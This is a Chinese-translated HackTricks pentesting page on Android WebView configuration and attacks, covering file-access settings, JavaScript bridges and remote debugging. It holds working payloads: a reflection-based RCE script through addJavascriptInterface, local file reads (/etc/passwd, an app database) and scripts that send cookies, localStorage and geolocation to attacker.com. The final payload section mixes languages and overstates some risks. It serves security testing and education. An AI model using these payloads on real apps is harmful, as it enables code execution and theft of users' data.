<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass) 或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


# 有趣的配置

## 文件访问

_WebView_ 文件访问默认是启用的。从 API 3 (Cupcake 1.5) 开始，可以使用 [_setAllowFileAccess()_](https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess\(boolean\)) 方法来显式地启用或禁用它。\
如果应用程序具有 _**android.permission.READ\_EXTERNAL\_STORAGE**_ 权限，它将能够从**外部存储**读取和加载文件。\
_WebView_ 需要使用文件 URL 方案，例如 `file://path/file`，来访问文件。

### 从文件 URL 进行通用访问 (已弃用)

> 设置是否允许在文件方案 URL 的上下文中的**跨源请求**访问**任何来源的内容**。这包括访问其他文件方案 URL 或 Web 上下文的内容。请注意，某些访问（如图像 HTML 元素）不遵循同源规则，不受此设置的影响。
>
> 如果打开可能由外部来源创建或更改的文件，请**不要**启用此设置。启用此设置将允许在 `file://` 上下文中加载的恶意脚本发起跨站脚本攻击，从而访问**任意本地文件**，包括 WebView 的 cookie、应用程序私有数据甚至用于任意网站的凭据。

总结一下，这将**阻止加载任意来源**。如果应用程序发送的 URL 请求使用 **`Origin: file://`** 来加载内容，如果响应不允许该来源（**`Access-Control-Allow-Origin: file://`**），则内容将不会被加载。\
当目标为 [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) 及以上版本时，**默认值为 `false`**。

* 使用 [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) 来了解是否允许在文件方案 URL 的上下文中运行的 JavaScript 可以访问任何来源（如果启用了 UniversalAccessFromFileURL）。
* 使用 [`setAllowUniversalAccessFromFileURLs(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs\(boolean\)) 来启用/禁用它。

{% hint style="info" %}
使用 **`loadDataWithBaseURL()`** 并将 baseURL 设置为 `null` 也将**阻止加载本地文件**，即使所有危险的设置都已启用。
{% endhint %}

### 从文件 URL 进行文件访问 (已弃用) <a href="#getallowfileaccessfromfileurls" id="getallowfileaccessfromfileurls"></a>

> 设置是否允许在文件方案 URL 的上下文中的**跨源请求**访问其他文件方案 URL 的内容。请注意，某些访问（如图像 HTML 元素）不遵循同源规则，不受此设置的影响。
>
> 如果打开可能由外部来源创建或更改的文件，请**不要**启用此设置。启用此设置将允许在 `file://` 上下文中加载的恶意脚本访问任意本地文件，包括 WebView 的 cookie 和应用程序私有数据。

总结一下，这将阻止 JavaScript 通过 `file://` 协议访问本地文件。\
请注意，如果 [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) 的值为 `true`，则此设置的值将被忽略。\
当目标为 [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) 及以上版本时，**默认值为 `false`**。

* 使用 [`getAllowFileAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccessFromFileURLs\(\)) 来了解是否允许在文件方案 URL 的上下文中运行的 JavaScript 可以访问其他文件方案 URL 的内容。
* 使用 [`setAllowFileAccessFromFileURLs(boolen)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs\(boolean\)) 来启用/禁用它。

### 文件访问

> 启用或禁用 WebView 内的**文件访问**。请注意，这仅启用或禁用文件系统访问。资源和资产仍然可以使用 file:///android\_asset 和 file:///android\_res 进行访问。

总结一下，如果禁用，WebView 将无法使用 `file://` 协议加载本地文件。\
当目标为 [`Build.VERSION_CODES.R`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#R) 及以上版本时，**默认值为 `false`**。

* 使用 [`getAllowFileAccess()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccess\(\)) 来了解配置是否启用。
* 使用 [`setAllowFileAccess(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess\(boolean\)) 来启用/禁用它。
### WebViewAssetLoader

> `WebViewAssetLoader`是一个辅助类，用于在`WebView`类中使用http(s):// URL加载本地文件，包括应用程序的静态资源和资源。使用Web样式的URL而不是`"file://"`来加载本地文件是可取的，因为它与同源策略兼容。

这是一种新的推荐方法来加载本地文件。目标是通过使用带有域名的HTTP URL来访问本地文件。这样可以在本地网页和从Web服务器下载的Web页面之间轻松维护CORS。

## 启用JavaScript

WebView默认情况下禁用JavaScript。可以使用[`setJavaScriptEnabled()`](https://developer.android.com/reference/android/webkit/WebSettings.html#setJavaScriptEnabled\(boolean\))方法显式地启用或禁用它。\
请注意，WebView还可以支持允许触发其他应用程序的`intent`方案。阅读此[文章以了解如何从XSS到RCE](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105)。

## JavaScript桥接

Android提供了一种方法，使在WebView中执行的JavaScript可以调用和使用Android应用程序的本地函数（使用`@JavascriptInterface`进行注释），方法是使用[`addJavascriptInterface`](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29)方法。这被称为_WebView JavaScript桥接_或_本地桥接_。

请注意，当您使用`addJavascriptInterface`时，您正在明确授予注册的JavaScript接口对象对WebView中加载的所有页面的访问权限。这意味着，如果用户导航到您的应用程序或域之外，所有其他外部页面也将可以访问这些JavaScript接口对象，如果通过这些接口暴露了任何敏感数据，可能会存在潜在的安全风险。

> 警告：对于目标为Android 4.2（API级别17）以下版本的应用程序，必须非常小心，因为它们在`addJavascriptInterface`的实现中存在漏洞：一种滥用反射的攻击，当恶意JavaScript注入到WebView中时，会导致远程代码执行。这是因为默认情况下可以访问所有Java对象方法（而不仅仅是那些已注释的方法）。
```javascript
//Class with a method to access a secret
public class JavascriptBridge {
// Since Android 4.2 (JELLY_BEAN_MR1, API 17) methods
// not annotated with @JavascriptInterface are not visible from JavaScript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
}
```

```javascript
//Enabling Javascript Bridge exposing an object of the JavascriptBridge class
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```

```markup
<!-- Exploit to get the secret from JavaScript -->
<script>alert(javascriptBridge.getSecret());</script>
```
通过访问JavaScript代码，例如通过存储的XSS、中间人攻击或在WebView中加载的恶意网站，可以直接调用暴露的Java方法。

{% hint style="info" %}
请注意，在尝试通过**重定向到攻击者的网页以访问本机Android对象**的漏洞时，如果通过移动**浏览器**而不是使用相同的**WebView**进行重定向访问，则**浏览器将无法访问本机Android对象**。
{% endhint %}

如果需要使用`addJavascriptInterface`，请考虑以下事项：

* **只允许使用APK提供的JavaScript**来使用桥接，例如通过在每个桥接的Java方法上验证URL（通过`WebView.getUrl`）。
* **不应从远程端点加载JavaScript**，例如通过在应用程序域内进行页面导航，并在默认浏览器（例如Chrome、Firefox）中打开所有其他域。
* 如果出于遗留原因需要（例如必须支持旧设备），请在应用程序的清单文件中将最低API级别设置为17（`<uses-sdk android:minSdkVersion="17" />`）。

## 通过反射实现的Javascript桥接到RCE

如[**此研究**](https://labs.f-secure.com/archive/webview-addjavascriptinterface-remote-code-execution/)所述（_如果获得RCE，请查看其中的想法_），一旦找到一个Javascript桥接，就可以使用以下有效负载通过反射获得**RCE**：
```markup
<!-- javascriptBridge is the name of the Android exposed object -->
<script>
function execute(cmd){
return javascriptBridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
</script>
```
然而，现代应用程序可能使用`@JavascriptInterface`注解，该注解指示JavascriptBridge只应公开带有此注解的方法。在这种情况下，您将无法滥用反射来执行任意代码。

## 远程调试

**远程WebView调试**允许使用**Chrome开发者工具**访问WebView。\
设备需要通过PC（通过USB、本地模拟器、本地网络等）访问，并运行可调试的WebView，然后访问**chrome://inspect/#devices**：

![](<../../.gitbook/assets/image (525).png>)

选择**inspect**，将打开一个新窗口。在此窗口中，您可以与WebView的内容进行交互，甚至可以从**控制台**选项卡中执行任意的JS代码：

![](<../../.gitbook/assets/image (526).png>)

为了启用**WebView远程调试**，您可以执行以下操作：
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
**此设置适用于应用程序的所有 WebView。**

{% hint style="info" %}
**WebView 调试不受应用程序清单中 `debuggable` 标志的状态影响**。如果您只想在 `debuggable` 为 `true` 时启用 WebView 调试，请在运行时测试该标志。
{% endhint %}
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
# 载荷

## 泄露任意文件

```html
<iframe src="file:///etc/passwd"></iframe>
```

This payload uses an iframe element to load the contents of the `/etc/passwd` file, which contains user account information. By exfiltrating this file, an attacker can gain valuable information about the system and potentially escalate their privileges.

这个载荷使用 iframe 元素加载 `/etc/passwd` 文件的内容，该文件包含用户账户信息。通过泄露这个文件，攻击者可以获取有关系统的有价值的信息，并有可能提升他们的权限。

## Exfiltrate sensitive data from local storage

```javascript
var data = localStorage.getItem('key');
new Image().src = 'https://attacker.com/leak.php?data=' + encodeURIComponent(data);
```

This payload retrieves sensitive data from the local storage of the WebView and sends it to an attacker-controlled server. The `localStorage.getItem('key')` function retrieves the value associated with the specified key from the local storage. The retrieved data is then sent to the attacker's server using an `Image` object.

这个载荷从 WebView 的本地存储中检索敏感数据，并将其发送到受攻击者控制的服务器。`localStorage.getItem('key')` 函数从本地存储中检索与指定键关联的值。然后，使用 `Image` 对象将检索到的数据发送到攻击者的服务器。

## Exfiltrate cookies

```javascript
var cookies = document.cookie;
new Image().src = 'https://attacker.com/leak.php?cookies=' + encodeURIComponent(cookies);
```

This payload retrieves the cookies from the WebView and sends them to an attacker-controlled server. The `document.cookie` property returns the cookies associated with the current document. The retrieved cookies are then sent to the attacker's server using an `Image` object.

这个载荷从 WebView 中检索 cookie，并将它们发送到受攻击者控制的服务器。`document.cookie` 属性返回与当前文档关联的 cookie。然后，使用 `Image` 对象将检索到的 cookie 发送到攻击者的服务器。

## Exfiltrate location data

```javascript
navigator.geolocation.getCurrentPosition(function(position) {
  var latitude = position.coords.latitude;
  var longitude = position.coords.longitude;
  new Image().src = 'https://attacker.com/leak.php?lat=' + latitude + '&lon=' + longitude;
});
```

This payload retrieves the current location data from the WebView and sends it to an attacker-controlled server. The `navigator.geolocation.getCurrentPosition` function retrieves the current position of the device. The latitude and longitude coordinates are then sent to the attacker's server using an `Image` object.

这个载荷从 WebView 中检索当前位置数据，并将其发送到受攻击者控制的服务器。`navigator.geolocation.getCurrentPosition` 函数检索设备的当前位置。然后，使用 `Image` 对象将纬度和经度坐标发送到攻击者的服务器。
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
# 参考资料

{% embed url="https://github.com/authenticationfailure/WheresMyBrowser.Android" %}

{% embed url="https://developer.android.com/reference/android/webkit/WebView" %}



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass) 或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
